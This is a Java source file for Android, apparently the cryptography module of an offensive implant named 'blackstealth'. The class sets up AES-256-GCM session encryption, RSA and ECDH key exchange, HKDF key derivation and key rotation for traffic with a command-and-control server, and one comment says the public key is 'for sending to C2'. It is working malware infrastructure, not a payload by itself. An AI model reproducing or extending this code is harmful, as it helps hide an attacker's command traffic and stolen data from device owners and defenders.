package com.offensive.blackstealth.crypto;

import android.util.Base64;
import android.util.Log;
import java.io.*;
import java.security.*;
import java.security.spec.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.util.*;

/**
 * Enhanced Cryptography Manager
 * AES-256-GCM encryption with RSA key exchange and forward secrecy
 */
public class CryptoManager {
    private static final String TAG = "CryptoManager";
    private static final String AES_ALGORITHM = "AES/GCM/NoPadding";
    private static final String RSA_ALGORITHM = "RSA/ECB/OAEPWithSHA-256AndMGF1Padding";
    private static final int AES_KEY_SIZE = 256;
    private static final int GCM_IV_SIZE = 12;
    private static final int GCM_TAG_SIZE = 128;
    private static final int RSA_KEY_SIZE = 4096;
    
    private KeyPair rsaKeyPair;
    private SecretKey currentSessionKey;
    private Map<String, SecretKey> sessionKeys;
    private SecureRandom secureRandom;
    private int keyRotationCounter = 0;
    private static final int KEY_ROTATION_THRESHOLD = 100;
    
    public CryptoManager() {
        this.sessionKeys = new HashMap<>();
        this.secureRandom = new SecureRandom();
    }
    
    /**
     * Generate RSA key pair for key exchange
     */
    public void generateKeyPair() throws NoSuchAlgorithmException {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(RSA_KEY_SIZE, secureRandom);
        rsaKeyPair = generator.generateKeyPair();
        Log.i(TAG, "RSA-" + RSA_KEY_SIZE + " key pair generated");
    }
    
    /**
     * Get public key for sending to C2
     */
    public byte[] getPublicKey() {
        if (rsaKeyPair == null) return null;
        return rsaKeyPair.getPublic().getEncoded();
    }
    
    /**
     * Get public key as Base64 string
     */
    public String getPublicKeyBase64() {
        return Base64.encodeToString(getPublicKey(), Base64.NO_WRAP);
    }
    
    /**
     * Generate new AES-256 session key
     */
    public SecretKey generateSessionKey() throws NoSuchAlgorithmException {
        KeyGenerator generator = KeyGenerator.getInstance("AES");
        generator.init(AES_KEY_SIZE, secureRandom);
        currentSessionKey = generator.generateKey();
        return currentSessionKey;
    }
    
    /**
     * Import session key encrypted with our public key
     */
    public void importSessionKey(byte[] encryptedKey) throws Exception {
        Cipher cipher = Cipher.getInstance(RSA_ALGORITHM);
        cipher.init(Cipher.DECRYPT_MODE, rsaKeyPair.getPrivate());
        byte[] keyBytes = cipher.doFinal(encryptedKey);
        currentSessionKey = new SecretKeySpec(keyBytes, "AES");
        Log.i(TAG, "Session key imported");
    }
    
    /**
     * Export session key encrypted with server's public key
     */
    public byte[] exportSessionKey(byte[] serverPublicKeyBytes) throws Exception {
        if (currentSessionKey == null) {
            generateSessionKey();
        }
        
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(serverPublicKeyBytes);
        PublicKey serverPublicKey = keyFactory.generatePublic(keySpec);
        
        Cipher cipher = Cipher.getInstance(RSA_ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, serverPublicKey);
        return cipher.doFinal(currentSessionKey.getEncoded());
    }
    
    /**
     * Encrypt data with AES-256-GCM
     */
    public byte[] encrypt(byte[] plaintext) throws Exception {
        return encrypt(plaintext, currentSessionKey);
    }
    
    public byte[] encrypt(byte[] plaintext, SecretKey key) throws Exception {
        if (key == null) {
            throw new IllegalStateException("No session key available");
        }
        
        // Check for key rotation
        checkKeyRotation();
        
        // Generate random IV
        byte[] iv = new byte[GCM_IV_SIZE];
        secureRandom.nextBytes(iv);
        
        // Encrypt
        Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
        GCMParameterSpec gcmSpec = new GCMParameterSpec(GCM_TAG_SIZE, iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, gcmSpec);
        byte[] ciphertext = cipher.doFinal(plaintext);
        
        // Combine IV + ciphertext
        byte[] result = new byte[iv.length + ciphertext.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(ciphertext, 0, result, iv.length, ciphertext.length);
        
        keyRotationCounter++;
        return result;
    }
    
    /**
     * Decrypt data with AES-256-GCM
     */
    public byte[] decrypt(byte[] ciphertext) throws Exception {
        return decrypt(ciphertext, currentSessionKey);
    }
    
    public byte[] decrypt(byte[] data, SecretKey key) throws Exception {
        if (key == null) {
            throw new IllegalStateException("No session key available");
        }
        
        if (data.length < GCM_IV_SIZE) {
            throw new IllegalArgumentException("Ciphertext too short");
        }
        
        // Extract IV
        byte[] iv = Arrays.copyOfRange(data, 0, GCM_IV_SIZE);
        byte[] ciphertext = Arrays.copyOfRange(data, GCM_IV_SIZE, data.length);
        
        // Decrypt
        Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
        GCMParameterSpec gcmSpec = new GCMParameterSpec(GCM_TAG_SIZE, iv);
        cipher.init(Cipher.DECRYPT_MODE, key, gcmSpec);
        
        return cipher.doFinal(ciphertext);
    }
    
    /**
     * Encrypt to Base64 string
     */
    public String encryptToBase64(String plaintext) throws Exception {
        byte[] encrypted = encrypt(plaintext.getBytes("UTF-8"));
        return Base64.encodeToString(encrypted, Base64.NO_WRAP);
    }
    
    /**
     * Decrypt from Base64 string
     */
    public String decryptFromBase64(String base64Ciphertext) throws Exception {
        byte[] encrypted = Base64.decode(base64Ciphertext, Base64.NO_WRAP);
        byte[] decrypted = decrypt(encrypted);
        return new String(decrypted, "UTF-8");
    }
    
    /**
     * Perform Diffie-Hellman key exchange for perfect forward secrecy
     */
    public byte[] performDHKeyExchange() throws Exception {
        KeyPairGenerator keyGen = KeyPairGenerator.getInstance("EC");
        keyGen.initialize(new ECGenParameterSpec("secp256r1"), secureRandom);
        KeyPair dhKeyPair = keyGen.generateKeyPair();
        
        // Store private key temporarily for derivation
        sessionKeys.put("dh_private", new SecretKeySpec(
            dhKeyPair.getPrivate().getEncoded(), "EC"));
        
        return dhKeyPair.getPublic().getEncoded();
    }
    
    /**
     * Complete DH key exchange with server's public key
     */
    public void completeDHKeyExchange(byte[] serverPublicKeyBytes) throws Exception {
        KeyFactory keyFactory = KeyFactory.getInstance("EC");
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(serverPublicKeyBytes);
        PublicKey serverPublicKey = keyFactory.generatePublic(keySpec);
        
        SecretKey dhPrivate = sessionKeys.get("dh_private");
        if (dhPrivate == null) {
            throw new IllegalStateException("DH exchange not initiated");
        }
        
        // Derive shared secret
        KeyAgreement keyAgreement = KeyAgreement.getInstance("ECDH");
        KeyFactory ecKeyFactory = KeyFactory.getInstance("EC");
        PKCS8EncodedKeySpec privateSpec = new PKCS8EncodedKeySpec(dhPrivate.getEncoded());
        PrivateKey privateKey = ecKeyFactory.generatePrivate(privateSpec);
        
        keyAgreement.init(privateKey);
        keyAgreement.doPhase(serverPublicKey, true);
        byte[] sharedSecret = keyAgreement.generateSecret();
        
        // Derive AES key from shared secret using HKDF
        byte[] derivedKey = hkdfDerive(sharedSecret, "AES-256-GCM".getBytes(), 32);
        currentSessionKey = new SecretKeySpec(derivedKey, "AES");
        
        // Clear temporary DH private key
        sessionKeys.remove("dh_private");
        keyRotationCounter = 0;
        
        Log.i(TAG, "Forward-secure session key established");
    }
    
    /**
     * HKDF key derivation
     */
    private byte[] hkdfDerive(byte[] ikm, byte[] info, int length) throws Exception {
        // HKDF-Extract
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(new byte[32], "HmacSHA256"));
        byte[] prk = mac.doFinal(ikm);
        
        // HKDF-Expand
        ByteArrayOutputStream okm = new ByteArrayOutputStream();
        byte[] t = new byte[0];
        int n = (int) Math.ceil((double) length / 32);
        
        for (int i = 1; i <= n; i++) {
            mac.init(new SecretKeySpec(prk, "HmacSHA256"));
            mac.update(t);
            mac.update(info);
            mac.update((byte) i);
            t = mac.doFinal();
            okm.write(t);
        }
        
        return Arrays.copyOf(okm.toByteArray(), length);
    }
    
    /**
     * Check if key rotation is needed
     */
    private void checkKeyRotation() {
        if (keyRotationCounter >= KEY_ROTATION_THRESHOLD) {
            try {
                rotateSessionKey();
            } catch (Exception e) {
                Log.e(TAG, "Key rotation failed: " + e.getMessage());
            }
        }
    }
    
    /**
     * Rotate session key using key derivation
     */
    public void rotateSessionKey() throws Exception {
        if (currentSessionKey == null) return;
        
        // Derive new key from current key
        byte[] oldKeyBytes = currentSessionKey.getEncoded();
        byte[] newKeyBytes = hkdfDerive(oldKeyBytes, "key-rotation".getBytes(), 32);
        
        currentSessionKey = new SecretKeySpec(newKeyBytes, "AES");
        keyRotationCounter = 0;
        
        // Securely clear old key bytes
        Arrays.fill(oldKeyBytes, (byte) 0);
        
        Log.i(TAG, "Session key rotated");
    }
    
    /**
     * Sign data with private key
     */
    public byte[] sign(byte[] data) throws Exception {
        Signature signature = Signature.getInstance("SHA256withRSA");
        signature.initSign(rsaKeyPair.getPrivate());
        signature.update(data);
        return signature.sign();
    }
    
    /**
     * Verify signature
     */
    public boolean verify(byte[] data, byte[] signatureBytes, byte[] publicKeyBytes) 
            throws Exception {
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(publicKeyBytes);
        PublicKey publicKey = keyFactory.generatePublic(keySpec);
        
        Signature signature = Signature.getInstance("SHA256withRSA");
        signature.initVerify(publicKey);
        signature.update(data);
        return signature.verify(signatureBytes);
    }
    
    /**
     * Compute SHA-256 hash
     */
    public byte[] hash(byte[] data) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        return md.digest(data);
    }
    
    /**
     * Secure random bytes
     */
    public byte[] randomBytes(int length) {
        byte[] bytes = new byte[length];
        secureRandom.nextBytes(bytes);
        return bytes;
    }
    
    public boolean hasSessionKey() {
        return currentSessionKey != null;
    }
    
    public void clearKeys() {
        currentSessionKey = null;
        sessionKeys.clear();
        keyRotationCounter = 0;
    }
}
